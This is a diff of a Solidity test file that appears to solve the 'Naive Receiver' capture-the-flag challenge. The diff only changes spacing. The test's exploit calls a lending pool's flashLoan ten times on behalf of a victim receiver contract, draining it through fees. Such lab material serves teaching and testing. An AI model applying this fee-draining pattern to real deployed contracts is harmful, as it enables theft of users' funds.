@@ -43,16 +43,16 @@ contract NaiveReceiver is Test {
     }
 
     function testExploit() public {
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 9e18);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
